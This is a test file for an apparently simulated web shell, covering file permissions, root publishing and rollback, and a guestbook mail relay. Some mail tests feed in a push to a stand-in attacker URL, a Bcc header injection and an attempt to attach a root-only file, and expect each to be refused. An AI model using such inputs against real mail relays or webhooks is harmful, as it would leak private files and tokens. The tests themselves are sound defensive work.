import { describe, expect, it } from 'vitest'
import { runLine } from './runner'
import { boot } from '../testkit'

const root = { name: 'root', role: 'root' as const }

describe('shell', () => {
  it('pipes and searches', async () => {
    const { ctx } = boot()
    const found = await runLine('echo hello | grep ell', ctx)
    expect(found.code).toBe(0)
    expect(found.stdout).toBe('hello\n')
    const missed = await runLine('echo hello | grep nope', ctx)
    expect(missed.code).toBe(1)
    expect(missed.stdout).toBe('')
  })

  it('keeps guest files in the browser and refuses published writes', async () => {
    const { ctx, fs, remote } = boot({ stdin: 'hello\n' })
    const written = await runLine('echo hi > /tmp/ada/a.txt', ctx)
    expect(written.code).toBe(0)
    expect(fs.read(ctx.user, '/tmp/ada/a.txt').content).toBe('hi\n')
    const denied = await runLine('echo x > /home/owner/about.md', ctx)
    expect(denied.code).toBe(1)
    expect(fs.read(ctx.user, '/home/owner/about.md').content).toBe('about\n')
    expect(remote.commits).toHaveLength(0)
    const secret = await runLine('cat /root/README.md', ctx)
    expect(secret.code).toBe(1)
  })

  it('stages a guestbook note and sends it only on mail push', async () => {
    const { ctx, fs, mail, remote, rt } = boot({ stdin: 'hello\n', webhook: true })
    let tokenReads = 0
    rt.tokens.get = () => {
      tokenReads += 1
      return 'ghp_should_not_be_sent'
    }
    const saved = await runLine('cat > /var/guestbook/ada.txt', ctx)
    expect(saved.code).toBe(0)
    expect(fs.read(ctx.user, '/var/guestbook/ada.txt').content).toBe('hello\n')
    expect(mail.notes).toHaveLength(0)
    expect(saved.stderr).toContain('mail push')
    expect(saved.stderr).not.toContain('hello')
    expect(await runLine('mail -m "hello there"', ctx)).toMatchObject({ code: 0 })
    const sent = await runLine('mail push', ctx)
    expect(sent.code).toBe(0)
    expect(mail.notes).toHaveLength(1)
    expect(mail.notes[0]?.subject).toBe('hello there')
    expect(mail.notes[0]?.kind).toBe('letter')
    expect(mail.notes[0]?.body).toContain('hello\n')
    expect(mail.notes[0]?.body).toContain('/var/guestbook/ada.txt')
    expect(remote.commits).toHaveLength(0)
    expect(tokenReads).toBe(0)
    expect(sent.stdout).not.toContain('http')
    expect(rt.outbox.draft.files).toHaveLength(0)
    expect(rt.outbox.draft.subject).toBe('')
  })

  it('lets root publish a file and roll it back', async () => {
    const { ctx, fs, remote, rt } = boot({ user: root, authenticated: true })
    const edited = await runLine('echo v2 > /home/owner/about.md', ctx)
    expect(edited.code).toBe(0)
    expect(fs.read(root, '/home/owner/about.md').content).toBe('v2\n')
    expect(remote.commits).toHaveLength(1)
    const id = rt.journal.mutations()[0]?.id
    expect(id).toBeTruthy()
    const restored = await runLine(`rollback ${id}`, ctx)
    expect(restored.code).toBe(0)
    expect(fs.read(root, '/home/owner/about.md').content).toBe('about\n')
    expect(remote.commits[1]?.changes[0]?.content).toBe('about\n')
  })

  it('refuses a root publish when the browser has no token', async () => {
    const { ctx, fs } = boot({ user: root, authenticated: false })
    const result = await runLine('echo v2 > /home/owner/about.md', ctx)
    expect(result.code).toBe(1)
    expect(result.stderr).toContain('token')
    expect(fs.read(root, '/home/owner/about.md').content).toBe('about\n')
  })

  it('keeps mail inside the work tree and the fixed relay', async () => {
    const { ctx, mail, rt } = boot({ stdin: 'hello\n', webhook: true })
    await runLine('cat > /var/guestbook/ada.txt', ctx)
    const pushed = await runLine('mail push https://evil.example/hook', ctx)
    expect(pushed.code).toBe(1)
    const themed = await runLine('mail -m "hi" --to other@example.com', ctx)
    expect(themed.code).toBe(1)
    expect(rt.outbox.draft.subject).toBe('')
    const broken = await runLine('mail -m "hello\nBcc: x"', ctx)
    expect(broken.code).toBe(1)
    expect(rt.outbox.draft.subject).toBe('')
    rt.outbox.draft.subject = 'x'
    rt.outbox.draft.files.push('/root/README.md')
    const leaked = await runLine('mail push', ctx)
    expect(leaked.code).toBe(1)
    expect(leaked.stderr).not.toContain('secret')
    expect(mail.notes).toHaveLength(0)
    const bare = await runLine('mail add /home/owner/about.md', ctx)
    expect(bare.code).toBe(1)
    expect(rt.outbox.draft.notes).toHaveLength(0)
  })

  it('sends a comment about a published page without the page body', async () => {
    const { ctx, mail, remote } = boot({ webhook: true })
    expect((await runLine('mail -m "about the page"', ctx)).code).toBe(0)
    const added = await runLine('echo question | mail add /home/owner/about.md', ctx)
    expect(added.code).toBe(0)
    expect(added.stdout).toContain('/home/owner/about.md')
    const sent = await runLine('mail push', ctx)
    expect(sent.code).toBe(0)
    const body = mail.notes[0]?.body ?? ''
    expect(body).toContain('question')
    expect(body).toContain('/home/owner/about.md')
    expect(body).not.toMatch(/^about$/m)
    expect(remote.commits).toHaveLength(0)
  })

  it('stages scratch files and leaves a letter unsent when the relay is off', async () => {
    const { ctx, mail, rt } = boot()
    await runLine('echo scratch > /tmp/ada/n.txt', ctx)
    const added = await runLine('mail add', ctx)
    expect(added.code).toBe(0)
    expect(added.stdout).toContain('/tmp/ada/n.txt')
    expect(added.stdout).not.toContain('about.md')
    const listed = await runLine('mail', ctx)
    expect(listed.stdout).toContain('/tmp/ada/n.txt')
    expect(listed.stdout).toContain('relay: off')
    expect(listed.stdout).not.toContain('http')
    expect((await runLine('mail -m "hi"', ctx)).code).toBe(0)
    const sent = await runLine('mail push', ctx)
    expect(sent.code).toBe(1)
    expect(mail.notes).toHaveLength(0)
    expect(rt.outbox.draft.subject).toBe('hi')
    expect(rt.outbox.draft.files).toContain('/tmp/ada/n.txt')
    expect((await runLine('mail reset', ctx)).stdout).toContain('draft cleared')
    expect(rt.outbox.draft.subject).toBe('')
    expect(rt.outbox.draft.files).toHaveLength(0)
  })

  it('stops after too many letters and keeps a failed letter staged', async () => {
    const { ctx, mail, rt } = boot({ stdin: 'hello\n', webhook: true })
    await runLine('cat > /var/guestbook/ada.txt', ctx)
    await runLine('mail -m "hi"', ctx)
    rt.outbox.sent = 8
    const capped = await runLine('mail push', ctx)
    expect(capped.code).toBe(1)
    expect(capped.stderr).toContain('too many')
    expect(mail.notes).toHaveLength(0)
    expect(rt.outbox.draft.subject).toBe('hi')
    rt.outbox.sent = 0
    rt.mail = {
      configured: true,
      async send() {
        return 'failed'
      },
    }
    const failed = await runLine('mail push', ctx)
    expect(failed.code).toBe(1)
    expect(failed.stderr).toContain('stays staged')
    expect(rt.outbox.draft.files).toContain('/var/guestbook/ada.txt')
  })

  it('expands globs, aliases and echo escapes', async () => {
    const { ctx } = boot()
    const globbed = await runLine('echo *.md', ctx)
    expect(globbed.stdout).toContain('about.md')
    const nested = await runLine('echo notes/*.md', ctx)
    expect(nested.stdout).toContain('notes/a.md')
    const alias = await runLine('ll', ctx)
    expect(alias.stdout).toContain('about.md')
    const lines = await runLine("echo -e 'a\\nb'", ctx)
    expect(lines.stdout).toBe('a\nb\n')
  })
})
